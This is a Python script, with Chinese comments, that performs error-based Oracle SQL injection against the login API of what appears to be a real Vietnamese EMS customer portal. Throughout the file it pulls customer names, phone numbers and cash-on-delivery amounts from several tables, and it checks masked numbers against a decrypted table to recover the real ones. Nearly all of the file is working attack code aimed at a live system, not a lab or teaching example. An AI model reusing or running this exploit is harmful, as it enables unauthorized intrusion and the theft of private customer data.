#!/usr/bin/env python3
"""
直接查询E1E2_PH_DECRYPT_DATA表的10月10日数据
"""

import requests
import json
import time

class DecryptDataQuery:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def query_decrypt_data_stats(self):
        """查询DECRYPT_DATA表的10月10日统计"""
        print("=" * 80)
        print("📊 E1E2_PH_DECRYPT_DATA表 - 10月10日统计")
        print("=" * 80)
        
        date = '20251010'
        
        queries = [
            ("总记录数", f"SELECT COUNT(*) FROM EMS.E1E2_PH_DECRYPT_DATA WHERE NGAY='{date}'"),
            ("有电话的记录", f"SELECT COUNT(*) FROM EMS.E1E2_PH_DECRYPT_DATA WHERE NGAY='{date}' AND DIENTHOAINHAN IS NOT NULL"),
            ("未脱敏电话数", f"SELECT COUNT(*) FROM EMS.E1E2_PH_DECRYPT_DATA WHERE NGAY='{date}' AND DIENTHOAINHAN NOT LIKE '%+%' AND DIENTHOAINHAN NOT LIKE '%x%' AND LENGTH(DIENTHOAINHAN)>=10"),
            ("独立MABC数", f"SELECT COUNT(DISTINCT MABC) FROM EMS.E1E2_PH_DECRYPT_DATA WHERE NGAY='{date}'"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   ✅ {result}")
            time.sleep(2)
    
    def get_decrypt_data_samples(self):
        """获取DECRYPT_DATA表的样本数据"""
        print("\n" + "=" * 80)
        print("📋 E1E2_PH_DECRYPT_DATA表 - 样本数据")
        print("=" * 80)
        
        date = '20251010'
        
        for i in range(1, 6):
            print(f"\n{'='*80}")
            print(f"样本 {i}/5")
            print(f"{'='*80}")
            
            query = f"SELECT MABC||'|'||NGUOINHAN||'|'||DIENTHOAINHAN||'|'||SO_TIEN_THU_HO FROM (SELECT * FROM EMS.E1E2_PH_DECRYPT_DATA WHERE NGAY='{date}' AND DIENTHOAINHAN IS NOT NULL) WHERE ROWNUM={i}"
            
            result = self.extract_via_error(query)
            
            if result:
                parts = result.split('|')
                if len(parts) >= 4:
                    mabc = parts[0]
                    name = parts[1]
                    phone = parts[2]
                    amount = parts[3]
                    
                    print(f"  MABC: {mabc}")
                    print(f"  姓名: {name}")
                    print(f"  电话: {phone}")
                    print(f"  代收: {amount} VND")
                    
                    # 判断是否脱敏
                    if phone:
                        if '+' not in phone and 'x' not in phone and len(phone) >= 10:
                            print(f"  ✅ 这是真实电话！")
                        else:
                            print(f"  ❌ 仍然脱敏")
            
            time.sleep(3)
    
    def match_decrypt_with_masked(self):
        """用DECRYPT_DATA表匹配脱敏表"""
        print("\n" + "=" * 80)
        print("🔗 用DECRYPT_DATA匹配E1E2_PH脱敏表")
        print("=" * 80)
        
        date = '20251010'
        
        # 获取5个MABC
        test_mabcs = ['701000', '236160', '700916', '725231', '100916']
        
        for mabc in test_mabcs:
            print(f"\n{'='*80}")
            print(f"MABC: {mabc}")
            print(f"{'='*80}")
            
            # E1E2_PH脱敏数据
            query1 = f"SELECT DIENTHOAINHAN FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
            masked_phone = self.extract_via_error(query1)
            
            if masked_phone:
                print(f"  E1E2_PH (脱敏): {masked_phone}")
                masked_last4 = masked_phone[-4:] if len(masked_phone) >= 4 else ""
            
            time.sleep(2)
            
            # DECRYPT_DATA真实数据
            query2 = f"SELECT DIENTHOAINHAN FROM EMS.E1E2_PH_DECRYPT_DATA WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
            real_phone = self.extract_via_error(query2)
            
            if real_phone:
                print(f"  DECRYPT_DATA: {real_phone}")
                
                # 判断是否真实
                if '+' not in real_phone and 'x' not in real_phone and len(real_phone) >= 10:
                    print(f"  ✅ 这是真实电话！")
                    
                    # 验证后4位
                    if masked_phone:
                        real_last4 = real_phone[-4:] if len(real_phone) >= 4 else ""
                        
                        if masked_last4 == real_last4:
                            print(f"  ✅ 后4位匹配！{masked_last4}")
                            print(f"  🎉 可以用DECRYPT_DATA解密！")
                        else:
                            print(f"  ❌ 后4位不匹配: {masked_last4} vs {real_last4}")
                else:
                    print(f"  ❌ 仍然脱敏")
            else:
                print(f"  DECRYPT_DATA: 未找到")
            
            time.sleep(2)
    
    def check_temp_data2_log(self):
        """检查TEMP_DATA2_LOG表"""
        print("\n" + "=" * 80)
        print("📊 E1E2_PH_TEMP_DATA2_LOG表 - 10月10日统计")
        print("=" * 80)
        
        date = '20251010'
        
        queries = [
            ("总记录数", f"SELECT COUNT(*) FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE NGAY='{date}'"),
            ("未脱敏电话数", f"SELECT COUNT(*) FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE NGAY='{date}' AND DIENTHOAINHAN NOT LIKE '%+%' AND DIENTHOAINHAN NOT LIKE '%x%' AND LENGTH(DIENTHOAINHAN)>=10"),
        ]
        
        for name, query in queries:
            print(f"\n🔎 {name}:")
            result = self.extract_via_error(query)
            if result:
                print(f"   {result}")
            time.sleep(2)
        
        # 样本
        print(f"\n样本数据:")
        query_sample = f"SELECT MABC||'|'||DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE NGAY='{date}' AND DIENTHOAINHAN IS NOT NULL AND ROWNUM<=3"
        samples = self.extract_via_error(query_sample)
        
        if samples:
            print(f"  {samples}")
    
    def compare_all_three_tables(self):
        """对比三个表的同一MABC数据"""
        print("\n" + "=" * 80)
        print("📊 对比三表数据（E1E2_PH vs TEMP_LOG vs DECRYPT_DATA）")
        print("=" * 80)
        
        date = '20251010'
        mabc = '701000'
        
        print(f"\n测试MABC: {mabc}, 日期: {date}")
        print(f"{'='*80}")
        
        # 表1: E1E2_PH
        print(f"\n【表1: E1E2_PH】")
        query1 = f"SELECT NGUOINHAN||'|'||DIENTHOAINHAN||'|'||SO_TIEN_THU_HO FROM EMS.E1E2_PH WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
        data1 = self.extract_via_error(query1)
        
        if data1:
            parts = data1.split('|')
            if len(parts) >= 3:
                print(f"  姓名: {parts[0]}")
                print(f"  电话: {parts[1]}")
                print(f"  代收: {parts[2]} VND")
        
        time.sleep(2)
        
        # 表2: TEMP_DATA2_LOG
        print(f"\n【表2: E1E2_PH_TEMP_DATA2_LOG】")
        query2 = f"SELECT NGUOINHAN||'|'||DIENTHOAINHAN||'|'||SO_TIEN_THU_HO FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
        data2 = self.extract_via_error(query2)
        
        if data2:
            parts = data2.split('|')
            if len(parts) >= 3:
                print(f"  姓名: {parts[0]}")
                print(f"  电话: {parts[1]}")
                print(f"  代收: {parts[2]} VND")
        
        time.sleep(2)
        
        # 表3: DECRYPT_DATA
        print(f"\n【表3: E1E2_PH_DECRYPT_DATA】")
        query3 = f"SELECT NGUOINHAN||'|'||DIENTHOAINHAN||'|'||SO_TIEN_THU_HO FROM EMS.E1E2_PH_DECRYPT_DATA WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
        data3 = self.extract_via_error(query3)
        
        if data3:
            parts = data3.split('|')
            if len(parts) >= 3:
                print(f"  姓名: {parts[0]}")
                print(f"  电话: {parts[1]}")
                print(f"  代收: {parts[2]} VND")
                
                # 判断是否真实
                phone = parts[1]
                if phone and '+' not in phone and 'x' not in phone and len(phone) >= 10:
                    print(f"  🎉 DECRYPT_DATA有真实电话！")
        
        time.sleep(2)
    
    def run_query(self):
        """执行查询"""
        print("=" * 80)
        print("🔍 查询解密表数据")
        print("=" * 80)
        
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功\n")
        
        self.query_decrypt_data_stats()
        self.get_decrypt_data_samples()
        self.match_decrypt_with_masked()
        self.check_temp_data2_log()
        self.compare_all_three_tables()
        
        print("\n" + "=" * 80)
        print("🎉 查询完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    querier = DecryptDataQuery(target_url)
    querier.run_query()
